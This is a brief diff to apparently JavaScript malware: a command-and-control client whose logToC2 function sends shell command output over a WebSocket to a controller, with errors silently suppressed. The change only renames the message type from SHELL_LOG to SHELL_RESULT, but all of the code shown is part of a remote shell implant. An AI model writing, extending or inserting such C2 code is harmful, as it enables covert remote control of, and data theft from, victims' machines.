@@ -20,7 +20,7 @@ function connect() {
 
     function logToC2(msg) {
         try { 
-            ws.send(JSON.stringify({ type: 'SHELL_LOG', output: msg })); 
+            ws.send(JSON.stringify({ type: 'SHELL_RESULT', output: msg })); 
         } catch(e){}
         console.log(msg);
     }
